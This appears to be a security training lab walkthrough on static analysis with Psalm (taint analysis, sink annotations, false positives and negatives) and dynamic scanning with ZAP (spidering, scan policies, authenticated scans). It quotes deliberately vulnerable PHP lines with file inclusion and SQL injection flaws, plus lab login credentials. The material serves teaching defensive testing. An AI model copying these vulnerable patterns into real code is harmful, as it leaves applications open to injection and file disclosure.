Open a terminal and go to the project's 
directory. You will find a psalm.xml file at the root of the project. 
This is Psalm's configuration file, and it should look like this:

```xml
<?xml version="1.0"?>
<psalm
    errorLevel="3"resolveFromConfigFile="true"xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"xmlns="https://getpsalm.org/schema/config"xsi:schemaLocation="https://getpsalm.org/schema/config vendor/vimeo/psalm/config.xsd"findUnusedBaselineEntry="true"><projectFiles><directory name="html/" /><ignoreFiles><directory name="vendor" /></ignoreFiles></projectFiles></psalm>
```

We won't go too deep into the configuration options, but here you can see the `errorLevel`
 parameter, which indicates how strict Psalm will be when reporting 
issues. The lower the value, the more issues will be reported. There's 
also a section called `projectFiles`, where the files to be 
scanned are indicated. Only the html directory will be scanned for this 
project, and the vendor directory will be ignored (as we don't want to 
test third-party dependencies).

With the configuration file set, you can run Psalm using the following command from within the project's directory:

Linux

```
user@machine$ cd /home/ubuntu/Desktop/simple-webapp/user@machine$ ./vendor/bin/psalm --no-cacheERROR: TypeDoesNotContainType - html/hidden-panel.php:10:5 - Operand of type 0 is always falsy (see https://psalm.dev/056)
  if ($result->num_rows = 0) {
```

By default, Psalm will only run some structural analysis over the 
code and show us programming errors that need our attention. In the 
previous example, Psalm reports that the condition on the `if` clause is always `false`. In this case, the programmer mistakenly used the assignment operator (`=`) instead of the comparison operator (`==`). Since the assignment operator always returns the assigned value (`0` in this case), the condition will always evaluate as false (`0` will be automatically cast to `false` in PHP).

The default tests will search for issues with variable types, 
variable initialisation and other safe coding patterns. While these 
issues are not vulnerabilities, Psalm will make recommendations so your 
code follows coding best practices, which is a good start to avoid 
runtime errors.

Psalm also offers the possibility to run dataflow analysis on our code using the `--taint-analysis`
 flag. The output for this command will be much more interesting as it 
will pinpoint possible security issues. The output of the command will 
look like this:

Linux

```
user@machine$ cd /home/ubuntu/Desktop/simple-webapp/user@machine$ ./vendor/bin/psalm --no-cache --taint-analysisERROR: TaintedInclude - html/view.php:22:9 - Detected tainted code passed to include or similar (see https://psalm.dev/251)
  $_GET    <no known location>

  $_GET['img'] - html/view.php:22:28include('./gallery-files/'.$_GET['img']);  concat - html/view.php:22:9
include('./gallery-files/'.$_GET['img']);
```

For each error reported, Psalm will show you a complete trace of the data flow from the source (`$_GET`) to the sink function (`include()`). Here we have a typical Local File Inclusion (LFI) vulnerability, as the GET parameter `img` is concatenated directly into the filename passed to the `include()` function.

Dataflow analysis usually gets the most interesting findings from a 
security standpoint. However, other structural findings are equally 
important to fix, even if they don't directly translate into an 
exploitable vulnerability. Structural flaws can often lead to business 
logic errors that may be hard to track or some unpredictable behaviours 
in your app.

# Dealing With False Positives and False Negatives

No matter what SAST tool you use, errors will always be present. Just
 as a quick reminder, we will generally be concerned with the two 
following error types:

- **False positives:** The tool reports on a vulnerability that isn't present in the code.
- **False negatives:** The tool doesn't report a vulnerability that is present in the code.

These errors might present themselves because the tool cannot 
correctly assess the target code, but they can also be introduced if we,
 as users, don't use the tool correctly.

As a quick example, when we manually reviewed the code before, we 
found three possible instances of SQL injection. Still, we discarded one
 of them as character filtering was being applied to it effectively, 
leaving us with two confirmed SQL injection vulnerabilities. If we check
 Psalm's output, we will notice only a single instance of SQL injection 
is reported (the first one in lines `6-7` of `hidden-panel.php`):

Linux

```
user@machine$ ./vendor/bin/psalm --no-cache --taint-analysisERROR: TaintedSql - html/db.php:18:32 - Detected tainted SQL (see https://psalm.dev/244)
  $_GET    <no known location>

  $_GET['guest_id'] - html/hidden-panel.php:6:65$sql = "SELECT id, firstname, lastname FROM MyGuests WHERE id=".$_GET['guest_id'];  concat - html/hidden-panel.php:6:8
$sql = "SELECT id, firstname, lastname FROM MyGuests WHERE id=".$_GET['guest_id'];
```

Just as an experiment, let's comment out lines `6` and `7` in hidden-pannel.php and see what happens:

```php
// $sql = "SELECT id, firstname, lastname FROM MyGuests WHERE id=".$_GET['guest_id'];
// $result = db_query($conn, $sql);

```

In theory, we should have no more errors reporting TaintedSQL 
instances. However, if we execute Psalm once again, it will now report a
 different TaintedSQL error corresponding to one of the other two SQL 
queries:

Linux

```
user@machine$ ./vendor/bin/psalm --no-cache --taint-analysisERROR: TaintedSql - html/db.php:18:32 - Detected tainted SQL (see https://psalm.dev/244)
  $_GET    <no known location>

  $_GET['log_id'] - html/hidden-panel.php:19:87$sql2 = "SELECT id, logtext FROM logs WHERE id='".preg_replace('/[^a-z0-9A-Z"]/', "", $_GET['log_id']). "'";  call to preg_replace - html/hidden-panel.php:19:87
$sql2 = "SELECT id, logtext FROM logs WHERE id='".preg_replace('/[^a-z0-9A-Z"]/', "", $_GET['log_id']). "'";
```

By now, you are probably wondering why Psalm didn't detect this 
vulnerability the first time. The reason for this can be found if you 
check the first line of both errors. Both show line `18` of `db.php` as the source of the problem. For Psalm, both vulnerabilities are the same and related to how you call `mysqli_query()` on line `18` of `db.php`. In other words, Psalm expects you to apply a fix there, as it doesn't understand that the code defines `db_query()` as a wrapper to any database queries.

Before continuing, make sure to uncomment back lines `6-7` in `hidden-panel.php`:

```php
$sql = "SELECT id, firstname, lastname FROM MyGuests WHERE id=".$_GET['guest_id'];
$result = db_query($conn, $sql);

```

To better help Psalm understand the situation, we can use some **annotations** to give more context. We can specify that `db_query()` should be considered a sink, so we get an error if any tainted input reaches the function via the `$query` parameter. To do so, add the following comment on top of the `db_query()` function definition in `db.php`:

```php
/**
 * @psalm-taint-sink sql $query
 * @psalm-taint-specialize
 */
function db_query($conn, $query){
    $result = mysqli_query($conn, $query);
    return $result;
}
```

The `@psalm-taint-sink` annotation tells Psalm to check the `$query` parameter for tainted inputs of type `sql`. Now Psalm will issue a TaintedSQL error every time a tainted input reaches `db_query()`.

We also need to add the `@psalm-taint-specialize` 
annotation to tell Psalm that each invocation of the function should be 
treated as a separate issue and that the function's taintedness depends 
entirely on the inputs it receives. This way, we will get both issues 
separately.

After re-running Psalm, we should now get all instances of TaintedSQL errors as expected:

Linux

```
user@machine$ ./vendor/bin/psalm --no-cache --taint-analysisERROR: TaintedSql - html/db.php:21:26 - Detected tainted SQL (see https://psalm.dev/244)
  $_GET    <no known location>

  $_GET['guest_id'] - html/hidden-panel.php:6:65$sql = "SELECT id, firstname, lastname FROM MyGuests WHERE id=".$_GET['guest_id'];  concat - html/hidden-panel.php:6:8
$sql = "SELECT id, firstname, lastname FROM MyGuests WHERE id=".$_GET['guest_id'];  $sql - html/hidden-panel.php:6:1$sql = "SELECT id, firstname, lastname FROM MyGuests WHERE id=".$_GET['guest_id'];  call to db_query - html/hidden-panel.php:7:27
$result = db_query($conn, $sql);ERROR: TaintedSql - html/db.php:21:26 - Detected tainted SQL (see https://psalm.dev/244)
  $_GET    <no known location>

  $_GET['log_id'] - html/hidden-panel.php:19:87$sql2 = "SELECT id, logtext FROM logs WHERE id='".preg_replace('/[^a-z0-9A-Z"]/', "", $_GET['log_id']). "'";  call to preg_replace - html/hidden-panel.php:19:87
$sql2 = "SELECT id, logtext FROM logs WHERE id='".preg_replace('/[^a-z0-9A-Z"]/', "", $_GET['log_id']). "'";  preg_replace#3 - html/hidden-panel.php:19:87$sql2 = "SELECT id, logtext FROM logs WHERE id='".preg_replace('/[^a-z0-9A-Z"]/', "", $_GET['log_id']). "'";  preg_replace - vendor/vimeo/psalm/stubs/CoreGenericFunctions.phpstub:1182:10
function preg_replace($pattern, $replacement, $subject, int $limit = -1, &$count = null) {}  concat - html/hidden-panel.php:19:9
$sql2 = "SELECT id, logtext FROM logs WHERE id='".preg_replace('/[^a-z0-9A-Z"]/', "", $_GET['log_id']). "'";  concat - html/hidden-panel.php:19:9
$sql2 = "SELECT id, logtext FROM logs WHERE id='".preg_replace('/[^a-z0-9A-Z"]/', "", $_GET['log_id']). "'";  $sql2 - html/hidden-panel.php:19:1$sql2 = "SELECT id, logtext FROM logs WHERE id='".preg_replace('/[^a-z0-9A-Z"]/', "", $_GET['log_id']). "'";  call to db_query - html/hidden-panel.php:20:28
$result2 = db_query($conn, $sql2);
```

**Note:** You will get a third error repeating one of the previous ones. This is because `mysqli_query`
 is still considered a valid sink (Psalm's has a built-in list of 
default sinks), so you should still have the original alert on top of 
the new ones.

Finally, if you compare Psalm's results with our manual review, you 
should notice that there are some differences in the results:

|  | Manual Review | Psalm Review | Verdict |
| --- | --- | --- | --- |
| $sql | Vulnerable | Vulnerable | OK |
| $sql2 | Not Vulnerable | Vulnerable | False Positive |
| $sql3 | Vulnerable | Not Vulnerable | False Negative |

A certain level of false positives and false negatives is always 
expected when using SAST tools. As with any other tool, you must 
manually check the report to search for any errors. SAST is an excellent
 complement to manual reviews but should never be considered as their 
replacement.

**SAST in the Development Cycle**

SAST is one of the 
first tools to appear during the development lifecycle. It is often 
implemented during the coding stage, as there's no need to have a 
functional application to use it.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/8d4c2f1e6b6b61d8e13d8e0c4597773e.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/8d4c2f1e6b6b61d8e13d8e0c4597773e.png)

Depending on each case, SAST can be implemented in one of the following ways:

- **CI/CD integration:** Each time a pull request or a
merge is made, SAST tools will check the code for vulnerabilities.
Checking pull requests ensures that the code that makes it to merges has undergone at least a basic security check. On some occasions, instead
of checking every single pull request, executing SAST scans only at
merges may help prevent slowdowns in the development pipeline, as it
avoids making all developers wait for full SAST scans.
- **IDE integration:** SAST tools can be integrated into
the developers' favourite IDEs instead of waiting for a pull request or
merge to occur. This way, the code can be fixed as early as possible,
saving time further ahead in the project.

Note that you may 
want SAST running on both the developers' IDEs and your CI/CD pipeline, 
which would be valid. For example, IDE tools may run basic structural 
checks and enforce secure coding guidelines, while CI/CD integrations 
may run more time-consuming dataflow/taint analysis. Remember that your 
specific setup will depend on the requirements of each project and 
should be evaluated by the team carefully.

If you want to learn how security tools can be integrated into a CI/CD pipeline, check the [DAST room](https://tryhackme.com/room/dastzap) for
 an example of integrating a DAST tool into a Jenkins pipeline. The 
process with SAST tools is pretty similar, so we won't repeat it here.

# Integrating SAST in IDEs

Your virtual machine has the VS Code editor installed and already configured to use a couple of SAST tools:

- **Psalm:** The tool we've been using supports IDE integration by installing the Psalm plugin into VS Code directly from the [Visual Studio Marketplace](https://marketplace.visualstudio.com/items?itemName=getpsalm.psalm-vscode-plugin). This plugin will check anything you type in real-time and show you the
same alerts as the console version directly into your code. Taint
analysis won't be available, so you'll only see the structural problems
reported on a basic Psalm analysis.
- **Semgrep:** Yet another SAST tool that can be installed into VS Code directly from the [Visual Studio Marketplace](https://marketplace.visualstudio.com/items?itemName=Semgrep.semgrep). Just as with Psalm, it will show inline alerts directly in your code.
Semgrep even allows us to build custom rules if needed. You can check
the rules that are loaded for this project on the `semgrep-rules` directory inside the project's directory. The specifics on how to build Semgrep rules will be left for a future room, so don't worry about them now. You can check the rules in the directory, but this won't be
required for this room.

Both tools will work similarly by showing any problems detected 
directly inline in your code. The only notable difference is that 
Semgrep will run when you start VS Code and will show you the problems 
it detects on all of the files, while Psalm will only show you issues 
related to the file you are currently editing. The plugins will add the 
following information to your IDE screen:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/0409daf7cdf144dfaa3e9f1e4ab2fcb9.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/0409daf7cdf144dfaa3e9f1e4ab2fcb9.png)

For
 each line where issues are detected, you can get additional information
 by hovering the mouse pointer over it. Here's what you would get by 
hovering over line 46 of `login.php`:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/9b3cd323e1ef63bac1c9dab83171827f.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/9b3cd323e1ef63bac1c9dab83171827f.png)

You can also check the complete list of issues by clicking the Errors indicator at the bottom of VS Code's screen:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/a879e9d06f657dbfd45dcc874dc3c91f.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/a879e9d06f657dbfd45dcc874dc3c91f.png)

Having your IDE check for problems allows you to produce cleaner code
 as a developer, contributing significantly to the overall security of 
your final application.

## **Dynami Appplication Security Testing (DAST)**

Dynamic Application Security Testing (DAST)

# What is DAST?

**Dynamic Application Security Testing (DAST)**
 is the process of testing a running instance of a web application for 
weaknesses and vulnerabilities. It focuses on a black-box testing 
approach where vulnerabilities are found just like a regular attacker 
would find them. Simply put, DAST identifies vulnerabilities by trying to exploit them, either manually or through automated tools.

By
 testing the application from an outside perspective, we can abstract 
ourselves from its inner workings and focus on identifying 
vulnerabilities that an attacker would likely find. This means the 
results obtained from DAST
 will often point to vulnerabilities requiring prioritised attention as 
they are expected to be found without prior knowledge of the 
application.

It is important to note that DAST
 doesn't replace other methods to find vulnerabilities in applications, 
but rather complements them. A secure development lifecycle will often 
mix several techniques in order to provide a good enough vulnerability 
coverage.

# Manual vs Automated

There are two ways in which DAST can be performed:

- **Manual DAST:** A security engineer will manually perform tests against an application to check for vulnerabilities.
- **Automatic DAST:** An automated tool will scan the web application for vulnerabilities.

Both processes are complementary and can be used at different stages of the **Software Development Lifecycle (SDLC)**. Combining manual and automated tools will often yield the best results rather than relying on either separately.

Manual DAST
 will help us find weaknesses that an automated tool won't easily spot 
as they don't understand the application from a functional point of 
view.

The problem with doing everything by hand is 
that running manual tests for every commit or small change in the code 
during the development phases will take too much time. This is where 
Automated DAST excels, as it provides a quick way to run many tests against the target application without requiring human interaction.

# DAST

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/d5b8c1597d4d218692e466e39364c9cb.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/d5b8c1597d4d218692e466e39364c9cb.png)

While every scenario is different, it is common to use automated DAST
 during the test phases. Automated DAST tools will often be optimised 
for speed so developers can obtain feedback quickly, unlike a 
traditional web application vulnerability scanner, which could take 
several hours to run. The idea here is not to provide an extensive scan 
of the application but to catch the low-hanging fruit early.

Manual DAST,
 on the other hand, is often run periodically to avoid slowing down the 
development process as a whole. It is usual to run manual scans weekly 
while applications are being developed, but this greatly depends on each
 project. A more intense scanning profile can be used in these manual 
scans to identify even more vulnerabilities.

When the 
application is ready to go into production, running a full-blown web 
application pentest is always good practice to notice any flaws in the 
final product implementation.

**Note:** Most literature will often refer to automated DAST
 simply as DAST and will often consider manual DAST as part of web 
application pentesting. Manual DAST might also be referred to as 
"traditional DAST".

# DAST

As with any other process used to find vulnerabilities in an application, DAST will have its advantages and disadvantages:

| Pros:
• Finds
 vulnerabilities during runtime. This will include vulnerabilities that 
are specific to the deployment process, which can't be seen by analysing
 code alone.
• DAST will find vulnerabilities like HTTP Request Smuggling, cache poisoning, and parameter pollution that won't be found using SAST.
• DAST
 tools don't care about the programming language in use by your 
application. Since DAST is black-box testing, all apps are treated in a 
language-agnostic way.
• Reduced number of false positives as compared to SAST.
• DAST
 tools might be able to find some business logic flaws. The effectivity 
will depend on the tool, and shouldn't be taken as a replacement for 
manual testing. | Cons:
• Code coverage isn't the best. DAST may not cover specific situations that will only be triggered by specific use cases in your application.
• Some vulnerabilities may be harder to find using DAST, as compared to static code analysis techniques.
• Some
 apps are difficult to be crawled. Modern applications heavily rely on 
javascript processing for the client-side. This makes it harder for DAST tools to traverse them.
• DAST
 scanners won't be able to tell you how to remediate some 
vulnerabilities in detail, since they have no idea of the underlying 
code.
• Some types of scans might take lots of time to finish.
• You need a running application to do the testing. |
| --- | --- |

# Ready to DAST?

Most of the time, you will find DAST
 contextualised as a series of automated tests. However, we will explore
 how the manual process works to understand better what most tools 
fundamentally do. In general terms, a DAST tool will perform at least 
the two following tasks against the target website:

- **Spidering/Crawling:** The tool will navigate through the web app, trying to map the
application and identify a list of pages and parameters that can be
attacked.
- **Vulnerability Scanning:** The tool will try to
launch attack payloads against the identified pages and parameters. The
user can typically customise the type of attacks to include only the
ones relevant to the target application.

**Spiders and Crawlers**

# Spidering an app with

The first step we'll take is to get a map of all resources in our target web application to identify the scope of our analysis. ZAP provides a spidering module that we can use to that end. A **Spider** will navigate to a starting page you provide and fundamentally explore the website by following all the links it can detect.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/9a6c2409ddb76cc7d67e97dc4ab9e118.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/9a6c2409ddb76cc7d67e97dc4ab9e118.png)

To spider a website, we can go to **Tools -> Spider**.
 This will show us the Spider dialogue, where we only need to specify a 
website as our starting point. For now, we'll leave the Context and User
 boxes empty. You can check the following additional options if needed:

- **Recurse:** Spider the website for links recursively.
- **Spider Subtree Only:** Limit the spidering to subfolders of the Starting Point URL.
- **Show Advanced Options:** Enable the Advanced tab, where you can specify additional parameters to tune your spidering.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/1cc8aecf25ac7dd193f23eda02aaf643.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/1cc8aecf25ac7dd193f23eda02aaf643.png)

Point to [http://10.10.234.128:8082/](http://10.10.234.128:8082/) and press Start Scan. After a while, you should see all the URLs that the spider found on the Sites tab:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/70b413458e34d59dfab7730076a6d299.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/70b413458e34d59dfab7730076a6d299.png)

You
 should now see the Sites list populated with all URLs found during 
spidering. Any item outside your starting page's URL is considered 
out-of-scope and won't be added to the list.

You might notice that if you navigate manually to [http://10.10.234.128:8082/](http://10.10.234.128:8082/), you should see a link in the menu that points to `/nospiders-gallery.php`, but if you expand the sites list on ZAP, you won't see this URL.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/d3cc974c61c619d9d1c8ad3a105693e9.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/d3cc974c61c619d9d1c8ad3a105693e9.png)

This
 happens because this particular link is not directly embedded in the 
page's HTML code but is generated on-the-fly by using javascript on your
 browser (as many modern applications do). Since the regular spider in ZAP doesn't have a javascript engine, it has no way of finding that link.

# More Spiders

To overcome the limitations of ZAP's
 regular spider, ZAP can leverage a real browser like Firefox or Chrome 
to process any scripts attached to the website and retrieve the 
resulting HTML code. Instead of parsing links directly from HTTP 
responses, it will do so from the result of a browser processing the 
website. This can be achieved by using the **AJAX spider**.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/5dd02378d74d65fd218806179a7bee7c.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/5dd02378d74d65fd218806179a7bee7c.png)

Leveraging a real browser is highly advantageous, as ZAP
 doesn't have to deal with all of the intricacies of current javascript 
engines but rather delegates this task to a browser, guaranteeing that 
the result will match what a user will see if they use the same browser.

Using the AJAX spider is a similar process to the regular spider. Just go to **Tools -> AJAX Spider**,
 configure a URL as a starting point and check the options you see fit. 
The only new option you have is the Browser selection, where we will 
choose Firefox this time. The list of browsers also has headless 
options, which will run the selected browser without showing you its 
graphical interface, but for now, let's stick to regular Firefox, as it 
makes it easier to understand how the AJAX spider works. Your 
configuration should look like this:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/279812c28d032528c9e21a242556a55d.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/279812c28d032528c9e21a242556a55d.png)

Let's
 hit Start Scan to make it work. You should see Firefox popping up and 
navigating the website for a bit. When the AJAX spider is done, it will 
populate the Sites in ZAP, just as the regular spider. Since the AJAX spider leverages the power of Firefox to get better results, you should now see `/nospiders-gallery.php` in your Sites list in ZAP.

**Scanning for Vulnerabilities**

# Configuring a Scan Policy in

When running DAST
 tools, it is crucial to customise what types of tests will be run 
against the application. The more you fit your scanning profile to your 
web application, the less time the scanner will spend sending payloads 
that aren't relevant to your specific scenario. Since DAST tools will 
mainly be used in a white box setup, all the details of the underlying 
technologies used to support your application are known. Here are the 
details of the application we'll be using throughout the room:

- **Operative System:** Linux
- **Web Server:** Apache 2.4
- **Programming Language:** PHP (No frameworks used)
- **Databases:** None

As
 an example, our application doesn't use a database. If you run the 
default scanning profile, the scanner will try things like SQL
 injections that would make no sense in this context. This would make 
your scans take longer, which might be okay with small apps like the one
 in this room, but the time increase will become noticeable when 
scanning more complex apps.

To create or modify scanning policies in ZAP, go to **Analyse -> Scan Policy Manager**. In there, let's click the Add button to create a new one:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/1ac88f365d495e2e16d2c08a3b72f1f8.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/1ac88f365d495e2e16d2c08a3b72f1f8.png)

From
 here, you can control the types of tests to be run as part of your 
policy. For each category, you will have two parameters to configure:

- **Threshold:** This parameter controls the verbosity of each category. A lower threshold means ZAP is more likely to report a vulnerability based on little information.
This would get you more findings at the risk of having ZAP report
vulnerabilities that may not be present (False positives). A higher
threshold will indicate ZAP to only report findings with a high degree
of certainty. This will get you fewer results, but those are more likely confirmed. The risk of using higher thresholds is that ZAP may not
report some vulnerabilities that might actually be present (False
negatives). You can also set the threshold to OFF to disable a category.
- **Strength:** This parameter controls how many tests are run for each category.
Higher strength levels are likely to report additional findings at the
expense of increasing scanning times significantly.

Since 
each application is different, these parameters must be tuned 
accordingly. Think of this as a trial-and-error process to be improved 
over time.

In the case of our application, since there's no database in use, nor any XML processing done, we can safely disable all of the related tests, as shown in the following image:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/66f829c81447674a82d4471f20ee5415.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/66f829c81447674a82d4471f20ee5415.png)

Make
 sure to also disable the Cross Site Scripting (DOM Based) tests this 
time, as they take lots of resources and are likely to slow down your 
scans for this room:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/3d6bb6853578feee1cf0244963e4a666.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/3d6bb6853578feee1cf0244963e4a666.png)

# Running our first scan

Now that we have a customised scanning policy, let's run a vulnerability scan by going to **Tools -> Active Scan**
 in the menu. Here we can select a starting point from the previously 
spidered resources and our newly created scan policy. Let's use [http://10.10.234.128:8082/](http://10.10.234.128:8082/)
 as the starting point and check the Recurse box to ensure any pages 
other than the starting point are scanned. Let's ignore the rest of the 
options for now and click **Start Scan**.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/9c098496f5c0fde49e12cd2cc8dd8665.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/9c098496f5c0fde49e12cd2cc8dd8665.png)

After a while, we should see some results in the **Alerts**
 section. You can get a description for each of the findings that should
 indicate what was found in general terms. You can also check the 
specific request and the corresponding response that ZAP used to detect the vulnerability.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/1fccaddf7d53f1d4ff346ccb3a0c5dcb.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/1fccaddf7d53f1d4ff346ccb3a0c5dcb.png)

This
 allows you to review the findings to ensure they are all correct. 
Should you think any of them is a false positive, you can mark it as 
such by right-clicking the finding and selecting Mark as False Positive.

**Authenticated Scans**

# Dealing with logins

So
 far, we have run a successful scan and found some vulnerabilities in 
the target application. Our application, however, still has 
vulnerabilities to uncover. If we manually navigate to our application, 
we will see an administration console that can only be accessed with 
proper credentials. Since ZAP knows not about these credentials, it won't be able to check anything that requires authentication.

We must teach ZAP
 how to authenticate and ensure its session is active to solve this 
problem. To do so, we will record the authentication process into a ZEST
 script so that ZAP can replicate the process during scans. For now, 
think of a ZEST script as a way to save and reproduce a series of 
requests.

**Note:** For this task, make sure to disable the ZAP
 HUD from the toolbar. Some things will not work as expected if it is 
enabled. You can find the button to do so at the end of the toolbar:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/ff24a4999f2585c783868e9831c541e6.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/ff24a4999f2585c783868e9831c541e6.png)

# Recording Authentication

To record authentication, we will click the **Record a New ZEST Script** button on the toolbar:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/e2b64ff46306fcaa73f43ef6d03f8f55.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/e2b64ff46306fcaa73f43ef6d03f8f55.png)

Let's set a title to our script and choose the type **Authentication.** We also want to set the prefix to the base URL of our application, as this will filter out any requests made to other sites**:**

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/1010de6ca8abc4959cfb08c3038f7d16.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/1010de6ca8abc4959cfb08c3038f7d16.png)

Once we click the **Start Recording** button, every HTTP request that goes through ZAP proxy will be recorded as part of the script. Let's do so and open a browser by clicking the **Open Browser** button on the toolbar:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/0388f61af29511f725930e7276b24b65.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/0388f61af29511f725930e7276b24b65.png)

Navigate to [http://10.10.234.128:8082/login.php](http://10.10.234.128:8082/login.php) on the newly opened browser. We will log into the website manually so that ZAP can record the process.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/1d0b37c6177d140a7d56e54b6b34824f.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/1d0b37c6177d140a7d56e54b6b34824f.png)

You can use the following credentials to access the web application from the login page in the menu:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/5d471dd234b7fc4eb4edea3c934663c1.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/5d471dd234b7fc4eb4edea3c934663c1.png)

| **Username** | nospiders |
| --- | --- |
| **Password** | nospiders |

Once we are correctly logged into the application, we will stop recording by clicking the **Record a New ZEST Script**
 button again. Feel free to close ZAP's browser as well. Some of the 
captured requests might not be necessary for the authentication process 
and can be deleted. In this case, these are the only requests that 
matter:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/222ed38cf31852051a655d82837c3269.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/222ed38cf31852051a655d82837c3269.png)

For each of the requests, ZAP will check the status code and response length to see if they match. If they do, ZAP will assume the login was successful. You can now test the recorded script by pressing the **Run** button on the **Script Console**:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/a9adece360ec6c218e18c19fedce7404.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/a9adece360ec6c218e18c19fedce7404.png)

This
 should allow you to test if you recorded the process correctly by 
checking the responses to the requests. Our application should respond 
to the POST request to `login.php` with a redirection to `cowsay.php`:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/3c14c45c4b8d5de40535cf43067b1407.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/3c14c45c4b8d5de40535cf43067b1407.png)

# Creating a Context

Now that our authentication process is recorded, we need to tell ZAP where to use it. This is done by creating a **Context**, which is nothing but a way to define a group of URLs.

Since
 this is a simple application, the recorded authentication will apply to
 the entirety of it. We must therefore define a Context that includes 
every single URL in the app so that we can link our ZEST script to it.

**Note:** Depending
 on your target app, the recorded authentication might grant access to 
only parts of the application. Think, for example, of an education 
platform where you have teachers and students. It would be expected that
 teachers and students each have access to different parts of the 
application based on their roles. For ZAP
 to cover both sides of the application, we would need to record two 
authentication ZEST scripts (one for a student account and one for a 
teacher) and attach them to two different contexts with the 
corresponding URLs.

To create a new context, go to the **Sites** tab and right-click the base URL of the target application on your **Sites** tab and select **Include in Context -> New Context**:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/477b3e232d8941566c7bbbc1f2e50eb3.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/477b3e232d8941566c7bbbc1f2e50eb3.png)

This
 will automatically create a regex that matches any page on the web 
application. There are many options you can configure under a context. 
For now, click on authentication, and link your zest script by using **Script-based Authentication**:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/43e47a26527ef59d5a680578be12f05b.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/43e47a26527ef59d5a680578be12f05b.png)

Be sure to click the **Load** button to the right of the script's name. You can also configure Authentication Verification in this tab so that ZAP
 can check whether it has a valid session or needs to re-authenticate 
during the scans, but we will do this later in an easier way.

